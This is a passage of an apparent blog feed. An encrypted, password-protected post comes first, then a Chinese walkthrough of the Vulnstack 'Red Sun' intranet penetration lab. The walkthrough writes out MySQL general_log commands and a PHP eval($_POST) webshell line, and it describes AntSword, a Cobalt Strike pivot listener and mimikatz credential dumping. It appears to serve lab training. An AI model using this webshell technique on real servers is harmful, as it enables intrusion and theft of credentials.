44f97c77070c8428915d8b5cfd25119ca05dfe40bbfe391fde8680948cfd0df493928e2292d099beccee0624e854bc624a1d6484b9e5fde65a89f6f6d63b64fbb4f90750ae024718952c4cfa4fe6b5938ef8589adcd8e78609f86d024d18de41b377236c0d789ed53cb480b2a96eb93e835150e549c07537150f73e08d38ea2d21a5da0d16449480c6c07643ec8120a6573ab988389c507c9b40ce0b436bfa233abdc12f059479e921715e0fdf32ee9392eb79dd09e85b067bbf37465026cd659831832cede388992e22cb41ddba04149b3323503889026d2baf3398332ac9f9c6044daace5b843d1378cd6a04b51aeeb7f9383fc96646fb98118a33b88e0dc873b0bb087b4b92c061d4a72e65808ecdafbd09955892d815bb40a4630d45f9c67b40fae534a795fda0aa5c78cc5c6d4e0eeefa81dad3713364d4c5afc5c306b82283b6265021940401e63fcbfc3d16641ea1a0eeac02803970509c8dc05312aac6b7203c283dd25aaf00cdb1249bb512c67b8f4571d23c564aacae3e0ff8ea2f02dc64d5406bf5731465f2a37ad7b16c7df603c872dadec834e2a1fab2d2fee39e77809669cf638b391ffc46b2dab61c5939c3b1b1acdefeb0dcd5c7ec9a9ea7b1fca7d1ceb0856e98aed5ca62b74af0b16f2811b50cb8c3659c767e1ca3ea6535f252086583b277f5674a9093ebfa2ea752b5eb4a14c23d545744cfcd6a0cfafdb8840f5f866bf04f2262f164d62bc111965c21d4f9f9165f3bb6aa93aad17b8429f2b0424b328e045be1d5d36713fc00a6204fc4bee50450920a7726dcde4e3f6ea8a3b4e21008c18d877714839c09d031f6846ea664467d1865ef4e28d9a0712a23aa7b2fd076b0a4fb0ca9b9638c78a1ba1b32dd1d35e35140f7c93256f178227baa09c5c3ddc61b77bfeb47ac693240ae2b6658984e60881e62fc3240839e3a33ec003f989dadbd585cb0ad386d3c4ee81f21555c2b495416341e5a9672ec093dd6bde0869e87fa25d643f90e55fddfc20b9f3cd651a3bbf375defd6f6f387cb34bae1206b21af2a139459d4d9ffa3d9232131883e7a8d78e3a351e19eb12e2f09d9f5b4e601ff0fa10fe2dddcf7063e6f87b666b009a09c46b58b023084a26a78bbfe7b8d73a4c1857f74c5c891593fc306662945f09021008170cdd3ed6a2341108e4bac3375c59b7fe5537376a182de9b8e42619e42bceec0f9dddd6f9bb21d9734314b398dd3b3bdbc50a20d23c134f0dac9a40bd41859d61f5f5bcf55141e8bdc3c6699f2ae549a9b6eb8bd0726f02496086a9795b3d8a87890dc844b6a7d7ece565f5a9712092a98b1f23f0e5dd663e344045b52740ea8ccf2dd2a0be0e71283dd0bdab52c4bf7e59a51edc6d8080000a6fdf91a21e77867f62e0e699f492d3a94bfe7808b77bf4e9acc6974285f0f023e9c92c89cc70fdbf6f6bc5d1ba1219866b8b0ffe9b408db6a27e075b66496d365208b3d817a57027e5a17ff2e8270402371cd271c163a83cc3b66cf3d5cbb98ed485e1338eef90212a90db596daacf5da48578f22a5b0e2a63b8ec4aeb464be12bfdf0bc1e83355895624e0f89b046b3c7ec6b21c1ca925f4ad5f356dc7bd730dbfe1388a803ba15e5c1d48b19d34ee42430918f1d7e85c8336e05830d7315ad813dd7343165fa0316f6b5ae52d435afb8eb1caba0fdcde8d647a6758a9cb3ef106c8bc2a1d5efef52b96e7765d4b624b9b1fa06fd959c6b18000f48c9effe78017775a464306c72e53e364d8c1f8c0b163325014d2ceda4fbb3171f0990226cb0fdeaa4716952ed2bf8c54bac8345a2217bc530631c8c1aa041953f7bb5320b2c2b04ccb6de05bd89c07a022d81dd64232b9e98c2f0479a4001cd4dce0d260a758a11927203749bc54678c9b9313fd4c2b037be71e7299a3d2acae6ff9a2aa5e680228d5f09d0e340d64c1bd0232200255bc9b9e333cad2566ae86f988dd040edaa5c1265c258121700aecb274e6974c0c038e094104d95ffb97140fd6836b6a010768ee86a9476e99bedf9d9bcbeab8eb5027ec6daa5d9234fb77c269991362f1a763589eadfad2f8083b6a7370f0c2383fc80ec033b49d141ae5dfa7bd09db6e94ca906c722d93ea069f9b0b1c532da2e94f60f7780674aacf3e32b2bf3c6be3e12da923164cf96260538c1959856e3b380abdf87a1cbc7ae1ada604fdbb4c7d2373a76fd26d334fb0668c46876111476f238ece5642fd178144b97a33bf4a96de10e8e3e6c30a21abd88d94c052c6faafcea51b5bceea8c899c43a6ad7a3265a292c9f8c930b34a45ca39c87771fd69416c1f954f633b9a56df7bc8c7ee2e80b3a635c8c59bac7b026d87a935ab92f41b6c88890445661a325a93a7238d86bc35fac0398fc80dad447754b3aafaa65a667893b8d02db0492805fde38feb2909263459a2f5e09ea9e0300df22a5feed3a3e2013faa1b751acf031602711df8a531df54dd5b7fe1a87bb1ce27fc94e9100b874bbc5ccf10e2a74c7566c799366ef3952225eaad2e58cdeacb2e04680ad93707df703b27e09ce6a5733ba18aec66780e618fe55b061708297e405c8b1db6e3c83114f7201038c7e8dbf29c258594c79cea644aaff07697c7f1187ac53c4489e8e1146d1c484148986f7bfda1d72bc93ab6369ac11f303c4958e5abd85b89c21e83db556df6d47e7c086f0e178fbf05a817a3df8605a8ef66ae8bb1905653dec7e3079be91ca09a0547c42ca9d3a828c4fd3fd489bdd2db4ea729ec75e527172dcd62ba52a41db9f6ea9d0eb0a11438deba7995bce6c865a3d21c4bb9536884b998dcf25e10c0c7a1ea04a603711a09ac551ab1d1e1e078d53158913c118b1e23ea8af3ad991d67f6802d601eb6f44c5811f2e41ef03807aaee7f146d7194575481a5ad3ae99eb014364f2a06b18d7b1fe667850e079a02c28e5c94abedd1ddddec89cd5d1e82d7ac29455168f1d6e2ceabd9ef7a9c3eca9940d26ba48b54e13697d6111b14076d0edef4fbf78b768b204bd7567e2e58de044fad793999898b4e6a232334cdfbeb43c61cf09315a74419818a73c96b97d37f72d26384b10526b82c77006afc7f70adc1cf5e03882a2855dd627ec8662377f7c5f5166465ed081a20b988affe3b20ef217eebe33d2bf2a88c9fb0036df08dea9866a24f90e2a43044e5938def8906ce688f7dc2be8cc58290c407029674486497f9f68d9bbc99560ca2ce97af2f3c234e301e60e9d64c806a2ec62ecb38a5cd8e47314b87095c4302ce82f2f26dfa6e23a7f8f81a5af3dbe411259cef794055232715d7e16fc40c1a75f47c0427ebfdb718fbda2b1cae1d1433fe5274971032f2d2ff153154f7f3421cc5a07fa34dd65cc9719318518c945de5d6d524a0fc3b29874834b6ab59e00c72e7abae7be0592b0096744ad1d83086b33113cd7c084681f5c32c3a36080b2dc039c6d88bd53ecdfcd9624b40aaf1cd71a0c654ecc5b72780b95b68789c04b2f1ed9f0dfdffa024d5cbe33709b6c0da4dd07fd129a264a88bb22f83f217928da41ffe774567174dd28aea5184dd7ba15a9d448649ecdf47793eb849cc4fc92c947a7b1bd628947754bce06968e4f7595f6bcaa83c24d4c62b1cf8f5edcdb0a1e7ec17e9bb24faabcfc02b85f191a7f4360b707259a00050c27fdc5641b072186ca92cb8bfea3e65aef92f41652321984466b10a3ce3838a5dfd50d9f0ccefef31949d405f67c9b9edb9a09af567478e95c2a1e87de7d2e0ef3b3e193b13c96fb7f36105edc2dd2b8afcbebb3a75574cbc1408062894bbdd85c9067e7bceb7e1b2d90ad33aebd30bcf3c45a550894a648ac6c146908d6e7223fb2f16d7e6e0e2bbb5f7c97f43b20104f15dc602814802d2b408123e176d64e5aebe5f5abbde5a84dc8807ef8a3425b310ed8b7dff1e2c9f52960f3089a3da77f624b82ad0512a9b3b3b5bd2f857a8ead146dea1c3542a08df12392db0cee693428c0c593317c684f7ee128f0b54744694ab7fb68f44f2b2a4dfc0affdbfc700dd091cbbfa7078f7b04bc3742b9f43e914fd6b06acd8cded3a5ead6372482c21b82ca400ce946e2f0f2a9c57c5961271bb0fb0e268cbc32855f02a47a7c7d5f147d5aa2036cefbd03c13541b4ab484777ae8ca50fa404c13ab16f957a0546de6b689d34d69adb4f33c461751e4e6b3caa3398ec534d86b53b607d3fe1e377a0fb02fe984d08c0ac483284dc53a810e4c85a673040f44a7d228fc4c43358b7335a87d56885924ea14f3efa5822c5a6bb45052d6edab55087bfb74bda074876bc910641e2e1d949b1abf7a23ac913d1d5afba3643197555c8956e0ff2e12a888bc76996a9240e22c2886df1074f35f01415c5c220f455b298ba21a0d19cc755196bb42c38a9147f5787f3ca35b9c68b58fc065df191db4047745ba2b32405a585c0fec40dc84b50a399fed2b862309a0d63d905f517c49b29722cf4da2d97e0381be6ab46749b4f30fcd9c9558e9c35ed5a730b0f6ed7359e4231e09e7b46f8424af30ed80f246f62f7c79836f222ae801cf9c64ef8335f3ceb4ae243339e102b9ff60ef064dbfe3fb4ef636b04d15f88f26b287b66c6da2dc26494dab3b597861fe962ab5fada33f727dc0e3a04d34fcc9922ea5e1a44590f86055f2561a212a3e1bd11f6cf41785a9a91de8b3510b29e093ed0ac4f6b6d76b340334ec3d9b8490ba6c53fc7f39a12cd069db1a4e48e0977ff7fc209bae4898ea66eee93db05fc7ae34dfa324c02f39565e2a687d2c3c5e1448a722a1d8deceb29da81a32585a5aee12720cf2e642c902c9d10cb19e93be2771d851aeaa8f64cbbcd7872cb3b59b7d1046e746aa7af2b8a97b9f007f51d873924878e573361c88cbb2862470d67b2523ac0178fcebc077bd3b91a35e948a8c0c3e86114262e3077f14c4aeec2473ce9f86b94ddbc18eddff6619000e0558ab85304ade8da189bb5446dfd6b7f027df41e1f8bbcddbef2c2db3ab9104c818dba92c83246b70547a4fb7a7851ce98ab47e1cee530901b7418ec0715ebd8a6b4825164075aa8d0a2365c4278148ba4d6ad8df0ecc88feba397b612b82d4ec54e9b05f0355e19b666934a44f7ff40b1489fd673e6d293b177b5a45b14e78daece234fbeb1b1946e67aad67e40c45b3c4f260c0d29e97c4fb75f4875f5abba6e415e76f5b132ad49cd1b5592aeb0fff2aafff379e287ac0d2a34ef7f53747bdc37534fb2fe1c0350ab4503b2aa5e323225428341cc3a8eb8d781cb83717b7de1709640486d914ed6545eb85436ef229f1b9d4fb41c0e1a2adcf64b1527081ca7be8b4f82833b58a6054126926cd547b4f6a8b26d7009205b6be1875c6ff3293244e3fa4cde6560f2cd156d9a7d6ae16908863b4b256f1bca189e2ed1e26e9b3e06a0fbb71283a1a3a0372e0c021a1e182a8dbcdaba1886e7e3fbfc1e9093dc170bb3199901e129c0f37ee08d1837d81581eb98a07817add7be07cf2c7cccdeec7cea8eb17ef5fd9787e9a6009e6a3425e2919ea06f181ae49f36629413df74a6e1cd3dca2d7a85a17887b5f35ca1f3c3600467ddc86f29ccbde7c4559e5ecbd731d88467f053995d293c540eed2df4442d1018c870cb811a25312fc03f4e845ffb73b979b217603394b30b1e30a0fb917617274dcb30ce634ff6c347b6e3f322827b07b4de8a628a752ec4320d20ea5eeffc48623a54b45b4c7a2e0c3031b7e54dd27c8433b7c12a576424b203eb1db16ba59774a589a78b4d8abf68deb2d5885f669e56f0076795f3805183e7aadffb3b69b672bc622fee549a14d0b847ba7b8ef57f2c76f4d256737be3c2d20bfe03afe4a1e3341136bfeeab67de08bf67701a1dfac002d960f427f741d824bacc8bde530641d8dbdd407bc31101c8b12a19d1d34f69f107e77d0fa74c8e4345203e1e636ee3fb52b2d70a1790a72091f961a87eab58e6435fcaf5d2a6b4d12fa9e04879f38e99c30932f0c242cd1398d874a4d714a645ef911e065ba7600f8c53c951fbd8991d60409bc9ddd7b17070d0cb74d166ecab04b1918ca212cd7becf0d5831d2053e473c9849476667a43542220cfa7573ce0404bf1140cccd7fe4282de986fbb3b43fdf1b75dd8c787d60b4e15fdfccea4e8fa56a2b5c663482d3a255ceefb7fcdb249a2f6691a72d1ac66de89905353463f1d53bd877ac33be9250209be6ac4ffe7e5d5ae77c56cb4dde9daf50e956c64f5b218ed45c472e96fe0bce3a2280978554e8d7345b4bc8daf17743c1658e3ca9cb0b67066e25be2821d9769bfa69919dbda451d1a73b6d327fd29b6ca1a3d2d1b7ab63062f056f426142edb3b52f4278739627c3cb8c50c84be4f3104e2c026d34853ff6226c2262d5249bfcde689b0d1461ef1b6ae28e26464a02c45227e95f9de52fa1c8ee4b4ae69b88c9171a6d98f47f0342beb4ccb457165df97261feeb5ce2329042135f48d219e4cb99c22f30591ec58edacd4a97d37732ab117862d2db37da8228dfc5727b52c2a387afb091454ac11f2cb1f3130518ca234603b85954b1ac327292a22fdf7e3c0ee125d02f7353f2b5a2f60a37f9dfb51fae2015875f880d86ec90ef0f900176084fa0e1a5d98fdf2ae3befc124320a8ec64145c9316ba2ce40f4383dd6ae2e99e6b3c04abd5ecbfcaf67d47e7c8ba8785cfab23cb1d37f493344c9b66d1a258472d7df03ff371e3e2da7349d671b6aab271389ba862b0bc29879ae857ec8a555adc5c81c8f375f172289d8011dcac14f0c82dc86c025f2d487331c695ab4d151c4e6bfc1f4d2972a7439614e24d16061115a2e0e076067b213b07dc628dbd019b00a02de7bd91a66bf65b0db78a52ba653bdeeedaf6cea19adfc9947619fbf97fdbe3679ec905b1c3aae8ee6a49adf5e0253dadf9573eae14477da6868394ee369b25021ba21e72928ad6a22f83026d0c399e217cf3f7edaabb0df2fc2f5346313bb7a29a7df278a02236718399328a5b7990d677a9ffc6dfa28c949dde67917f55adc970700118b2aad882b3afdd320ababc4d3bc36390597b1f449592438fd7972654b2de63c0e80d2f6860a681527ea866f83aa59fd997788a1bd115f12ce0d779d24d28664d8c53190b784a285c060165abf93e55bb1e61c2235ec8343711bb24f443acc7efdd498ac3eed98f4e1cf4e9bcb1222c59b83c229973c1dcf6eacfe38d6eeab1c52c8a178208325a89cb3eff474395abbf8a332e8c0d3e3540d8a997d0e0efbd16a376049f05bb9300f63afdaf7d922781c58945517e8ecdd818484febf2ecd3ffb67b26842f99150bcdeea7e7309a5f36772f7437fd8401f6a055dcd795bc8d0c6451b01edec3e558f1ce306488b5f0fe7c74d17c09449c92bd4fd6e82b9d325287f3b44b0b7d2d3a24947a8a0fb1866636f842b1d7fda7e8984a057f3fba9b9368f6eaccfeb9b0021076ea7ce8dc147ffebc7e873ce1374d65fe12ad0523fd3665f7c564564c5b57f32d6e6304547f9f5261edb5bc45dd7839c93bc45037312fdf1b83fa17a18baf4e9e90d5969d263ceaf2f4a37e31de45fe9218b9d37e4ef0721a7af3a02628b393bf6ff4aed54627f4bca7180ea98e62084263921d3b6feda24fa5cb91e4f5033f2f4ea6a38460a81717379d01b27e9ea2c68459fa7549282c37032168a767fbfc6484ebd754b09c54bc6d5789bd164243e653f73819a01cca6e516c4087d023b82e99b1ed59420df6b46676952cab8ea917b972db8972965147ec27709400a684023eed29b35d3d68a97a6d0517fadf241c70b08d519c668f60d19d1f85637a8b41f91d74a2cc97b23c0a136526a782db80d902d4bfe92fed6ea77fd01a9e59afab7d1aa6d6ea104d245dee8b6899f456daaed17b3b5c647a5c4bbc49c78abeeff9500beb027aa255dbc818732326079e7ef7153902e179b01ab1f96d23687af0b3d2b8a8b8e5d44d8a139ea3a626158e3d95665815edf45fbf9a580bd118ded57485ca3f25e52c43a7f46cc122c3fd41f03d7cd81a0aac9a4bdd4813d823fd39fc9faea9fffc795ec75188bf7210f09a973cd52f1135ae5a4a8b189a7ea7fa238ff6662645163167264c1b489ae81618a57b1f84f6332086d4b384c766d3b38308d5e5edd8c7aa8c968334cb911d754f32467a33936c5d5787a5ae7db5333229dd46cc47547969fe15199f4e2703ab8fc6676bdea4703cc063ceee327d587bbaf15aec26aa941308b59690174366a391e057b64b6621ad8e86e81251fb0fb4ec882417467a9041a617f78879d5584c92453e796d08fa6bc71a127dab4ab3182de155b83cac64a43c5b2096ea7cc8386a252151671b549751b7d8b2dc10eb202dce0f9f09c315d445569057764a796192d9552c67cf54a7f723f60afb617ea5a5aec02873150f7b3796273193f7e20070c5fffac95f7cd90a7161c5c78e10f35668d2fd6e6083acde6cc7d62178a26b7dae3b50283d82aae1ce32a6c4dfd9732dfb000c68aca75acc7f13a2a7cea288c41b0e36349945c565b4e7ec7a781ea1ab07cd91e569a9433f802958d778e62a1721f09a411e66ede680814d67b49bc49a75756c2de72c18855689eb19c866a0cd688ee481a00abaf8c1934948984fba5326f510ebd2e1e94a6ef51c0f3957722fb7ccd9b7d3f13dab66397f3bc886626ec834d8eb774ce16e04c4455725f92c11356a2a38be1a535a4f1034f2eda1d4634d15421ed7ee38c3fca45a0378e44f233b8021c0091285f5444380f653989dee79e023763c2603a1671784f0dcc73f15f08eb4775e44272b3ff96d5fba7a6746e601747f1efda3b984f1961fe6ba3925ae47dc07ee158c51fed82ef4d45b137f0bbbe00ec570975aa7e21da750be5fdac0f262fa7717945cc5e64ad689e00242eb0e7518e3e40c40f58bd0d06e243ed67996fcd0cae55f7df5939e113fc893e9218d86031f7b19ea49d8c01bc5a90c178f404edeb7bd88f2a46595b4b5ff6b84c0414b46db86988aaec281fe4e93aab2c2f74c59fc6ffac0d27f45d2f31ce283fb8f1ddcc2a9b70a776eaac3ab2ae9e6524055e123b2f623828b6df9b81a1f5c7d9046129591b8109badbd33c7aeea8681ad4892f0bf9b92a3cadd3fba06b3d997a27ab66cfd5b6d35b63134ab313d6a2c7b7e21ff95c0534986828f84940ee48d33d8c0eaccce4718a2735ed419e90c29baef5b5c876dc71ad95d6a98cdbd3cfd92bac4ca7c6c4931cd5d8ae24d118d695e9e5d9004b74e1cab49704899384cf0f53a3144e508896aed10a50ef617f75df132e53158313bee5d5a1829310479ee0e4652ef5908e971a21b4dd1bf7696e8fcecea4f5c78abee2d27bfab84d0703bd51e412d130576a27f50658d3da172c1be5867ee3bb42d88099f7a1e56cbf50a954c51c552ab4f889681d81b729d13545e416d6aeb930e397f7144347c45cbd85ac195d276015a231fcf32752c2463d1ec4c0cc6b2e334f3a531e1f8774a2fafcdfd8b732ab7b012d614836c81236a252e6fd7a0973a870123242fe8e396732fc2e178477c8be123686a9009b7046c8741fcfc8a836ff560313d3eaad557e71497d91a4b1a84d1a10b4d1e198f294a8429cf4eba2efb2429e2ad6859c3ec239af6a95e16ed3c7713a2e27ecc18d2592f2b024ebd098789988ffdac37fcbe2c86956a70d43e377f8cfaf8619ba207c663662bed318c3a67bc2e29b65cf2e423a975b0b88657767d3c81641bda93b6a8bb13a3939a8f7c02ba52f9f286bdfa58d6399750a363082978c3bb6a4a06272ee2f5c0df3e1137cd621412db3f24cbe4f27054898f3a58c466419065c70144b1d46911d6392ada2c5a979e5353a6fa09287f4f650534358dfbed921c54b32c3d18efd136b606acc76a3bd2adaf4fdb3d84e47cc95ef038964ec209fa6950d246ca7be467c99dd8be1aa2b71a7561262da1317a1e5c7c1f6326aa86458923327b01151e618df272c206dcc18ac68960cedab11ebb8f047bbcebd2c4a77d9bec54f47a9ae69ddee7fb97c737373703bffa1c45b5a97e3567362d97542ffe4f0effb887a522d29766c0e4e292531deb335fc892afb36bc54554723899acee21b258cf9864a0626d1f3ee6d70b71178b73d13c3253f6732a408bf091b0a18aaffc8a8c8a9b19521fa63a102b06e8a771bee192e9c43ccfd675fb13abe1484ba79727c791c2397c760b362ad18a7e36f1d14939a39042344823769c1368fb73ab6f7f008dc21dccf568b2a890cc1e8b564f009a33d8fffc467f9d62fa25d032c9382432156ddfb71fa8c8ba5908d281b60e5ff6b904238b078c0483b4f16bcb947b2ceae2b06122e2d246f6ad255a9ddcf4a0b85560fad2223e2221c0c8bdf463abb57355a71e6c76849ada99b99d51fad5af7f957c25025de188130a116422cb3a3bca00e7988eef52aa3effdf8554899aa2f3645d2ff33930af5102eb02e7892f2baefe595aec6e9898a9aae7516fb2b86d9ff7f6f2ae29f8012940a20244dd4be568ce4e9f0b5000c209f17381fa6e9f9c977973829baa0d3bdafe24319e6b6efa55c55ba967305432382dbe85b8d9b3c4a292a124b4cdc180366ed3ef267b5631ad2ddd80e57a4bbe2737cd4265d1eb2e455af3e3490372392c5c1fb2abcc0c8636ec869c866846fa7440349d528c90bcc39bc444d1b333e3d852c02fb8b8914a6af84682b25c7c1923a4e201cb920657ac43375153cd5942ebb97ea8ebe2e02c4ddfae8c5c781131cf48fb28c0b25e17d9cbbb22bee930753f41482432193002d35921c3852d0ac3c30580bda01f9dc3c38b16a9d6b3891f6306e998919e3e9a9f9e7c8acc782d75599198b7567a7cae404f4a1730b9f576d0274591bcd4414bc142d7e856addcaef8f5bfd4eb91a40d654dcded2a9138abfdf16766cac503b799604b3916a04bf67e21de288d94f0a1c434f71399f708edb8ef6a6496ac4566de631c8ed6e9acf7f9b82531a8a9f862983d02d0652c156edf650626115448808b3f75659f3370040a9940092f20c703909cb9efe4209f261e453443cd934f92f08a1f04593d1efb6750da8e7bf71c810107f2274e22993d14f14481ce2922e7bbbfbf50ffba3f66854ceeaf8e009c92142b9ab2b8200e60d20a0df88e8cd3c290949df4197da2f8623a2ea9619a1ce2b4941b756c31d14b1deb24beae5988b07ea62ee6209a9bdc131fd5c011cd35daa814c03ed9effce79601e9e282f503746c628ad25190747340a61dbeff9e3fc64dc76545326e3138e5d9c7071ab4c374ad64834085ea5cefacd98a6e4033d34ab5c21f0705b14a5c97432adfe964bbd6f83e2f4ead1c666d7e0c79c67282967a9aa2114e9a23a60b253009a1910ba8a81b44873ff4186c64ec1db23a1d29c815c9b409e6f3e28372a513e7f5afaf1a42a445013110d9b18033edc15761e11e0b6c8719efc284f7009fd9a581e2e5a4b4e5ada069d385552badf43e107dd6dfe75ce053936118f7dc7c7f03be8ad63ef00812b50a671704d2ad7fdd7029956bbe0c009af0bf5b5fd7b7c393d1dfe9e1683a1c9d917cfced2b4eec86941c950c65e55500818cb85154bebf343d22fae0d44109eb302c0c135cfa652a2e9a68b36584ee0c9f1b76b2ce2827124c86c63d05bd54b8f701a879713a95c5f86d09a71b9f55b38e7b1211398563f6c66d1c1efe2f7a6312d4e7b8abb4c3f1f364f66705831fad8468a28d5c7b8da11a0dac0ac2f7693929d44bce94ffb247b35c997b2375e8ad8873f6d9a6a97a044e20dc4e2675f71e3af36e15554e69704126f1d6eb338d3f132f20f675229af69ae880d712effe03516c50a00823e02dea2164172f1ed131d48f1e4b18fdf9d131751fd66ccc193f4c4c19a65b48769b9abea8d82144f02429d6a89b9034ded4c24310d4ffe9f581f4bab8b3a1191a66848658d802cc94248e010baacacec98c039df9f11307df152c8a2eb138bf3426db6f3b758f3eb6ee76885737a67ce34f7b4f3f04aed63b7ba29fed17b70a7692ac9217f570c3bd768c7de9378b6799f34e22b71bcf886c248144bf91d9c9c000b31c179ec95a381d66fc5a04510d34c6ffd510ffbc91f0cfd906294c9624230f400c7e29d584e5063d4c99ba9a7065cb185b0b11b0c1bd249778023fc36030ded365ec805c1460d1dd812e45783081098950a97ac586de05d926bf4b06aa49767d462e569f55f92a4ee03c756f78f0cf1489676e49c0f9e2baeb6d9d11e3b4d885b59f5d2b4fab032197ff758191e8bd8dcd2365e88eb63aaa988e32bfcaea09e9bbcb7b659e7b28f66ba086b8b65a625c5ce6949cd3d12a3a79b8369c1243e18a6db12571aa6920314f1ce2fcdf54b3b65a1b03642621108e0c603ef3bbb96285adbf3ff5a2d87bf5414b72ca8da632c15636ab50369c856c5a0915de4e96ebeb0fce6d217a2943c90a24b56bf7380dc38e8744e2a3101a5c33a85bb1689833547008f7268246fc090cd907e989d78ae39492cbf62f9a6188a2c2db18b38e180dc3c6cfb505f97224f41d0aa655f8eec4b6c71b3b44a5cf1483e3e099718429125615b4ed6e471936d53dbe1f598c62165a49e969d9c35867862b1c377027c123cd7c8dfe70a420e81f8c2536b3ad59c4822ecb1de835593be231288e3b262fff40f79a2c3af4b620ead37f460370438dd92b8061d72a79c94c58ff0609dc6a33ba4633f6021c28d259a7a0d6b6d1ac755301a8f76d7c100aed8d48c3684fbd7f4f4e2886fd5e4bc2c8a43df00f6c6cd15ee872227b91c3702b7b3dc715a23237e6c9510b81bf2821081ca86780155f3408cf739d64bd99d0479c9a17af24c083a3962d9e1b80c2f65b93a2a8a97250fab4f516f492771c9a4c6748b3f01e5b4b30bf1f6299ba6dadfb1ed5c40b8bac7fce841afca382b604592ed6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>openssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶机一</title>
    <link href="/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/"/>
    <url>/2022/06/15/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%B8%80/index/</url>
    
    <content type="html"><![CDATA[<p>拓朴图如下： </p><p>（win7为VM1（192.168.1.9、192.168.52.2），win2003为VM2（192.168.52.3，win2008为VM3（192.168.52.1））</p><p><img src="https://img-blog.csdnimg.cn/886c87685038405b9e50ae2350ef1336.png" alt="在这里插入图片描述"></p><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对web服务器进行端口扫描一波<br><img src="https://img-blog.csdnimg.cn/e510f3e8ea8f4159aa0d26af50168898.png" alt="在这里插入图片描述"></p><p>发现存在80和3306端口，访问80端口如下<br><img src="https://img-blog.csdnimg.cn/e0cb1a0daaa943339309ad4501e4a652.png" alt="在这里插入图片描述"></p><p>发现是phpstudy的一个探针，那么就有可能会有phpmyadmin的web管理界面，目录扫描一波<br><img src="https://img-blog.csdnimg.cn/085e23242ba44da7bd687aabbeec2f37.png" alt="在这里插入图片描述"><br>发现确实存在，访问看看<br><img src="https://img-blog.csdnimg.cn/269742edc83a46f8a26bb5c8ae4ba806.png" alt="在这里插入图片描述"><br>随手一个root&#x2F;root就进去了，现在就是通过这玩意儿拿shell了<br>有兴趣的读者可以看看这篇关于phpmyadmin漏洞的总结文章：<a href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0">https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label0_0</a><br>这里通过日志文件来进行拿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启日志记录:</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-comment">#查看当前的日志目录:</span><br>show variables like <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-comment">#指定日志文件</span><br><span class="hljs-built_in">set</span> global general_log_file = <span class="hljs-string">&quot;指定日志文件的路径&quot;</span>;<br></code></pre></td></tr></table></figure><p>我们在前面通过phpstudy的探针可以知道网站的路径<br><img src="https://img-blog.csdnimg.cn/74c91f57f1db41b78d1e5766ce43dcc5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1dc76c95286342c89fde493f004d1b6e.png" alt="在这里插入图片描述"><br>设置成功，写入代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select <span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_POST</span>[&#x27;x&#x27;]); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f58f6bd83fe74c8382972dc74c5728d8.png" alt="在这里插入图片描述"><br>用蚁剑连接<br><img src="https://img-blog.csdnimg.cn/b7a464e4c7fa45a898bcb579c797f37e.png" alt="在这里插入图片描述"><br>我这里直接用蚁剑上线C2马子<br><img src="https://img-blog.csdnimg.cn/0f4649bf51834a6491fb7e5921da1058.png" alt="在这里插入图片描述"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>这里直接就是管理员权限了<br><img src="https://img-blog.csdnimg.cn/f11f2915ee0f44c2ac9488789d0e9bfa.png" alt="在这里插入图片描述"><br>用mimikatz跑一波<br><img src="https://img-blog.csdnimg.cn/0564d696c301485d97da4ab55d41295a.png" alt="在这里插入图片描述"><br>查看网卡<br><img src="https://img-blog.csdnimg.cn/dba2263cb4d148fb95f6f63a94d3b1eb.png" alt="在这里插入图片描述"><br>看看内网存活有那些主机和端口情况<br>这里应因为内网机不出网，密码也跑出来，万事具备只欠东风了(这里图片挂掉了)</p><p>首先在已上线的机器上创建如下监听，监听端口可自定义。利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。</p><p><img src="https://img-blog.csdnimg.cn/bb69a2919d9d49a4b7095ac3dd575d16.png" alt="在这里插入图片描述"></p><p>生成payload载荷<br><img src="https://img-blog.csdnimg.cn/b265f99f567c4813aebc224bf09be8ca.png" alt="在这里插入图片描述"><br>这里选择我们刚刚创建的那个listener<br><img src="https://img-blog.csdnimg.cn/8d7e24e5cc61416193d9d56b6b06adb3.png" alt="在这里插入图片描述"><br>将生成的载荷上传到目标机器，并执行<br><img src="https://img-blog.csdnimg.cn/7e64294c41d1459aaeeea87681e62c1f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c285c27dbe2a460b9621f421e36fd1c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/839a18d75eeb41489d45da0dfcfe2a8b.png" alt="在这里插入图片描述"><br>接下来就可以对其他的内网机进行上线了<br><img 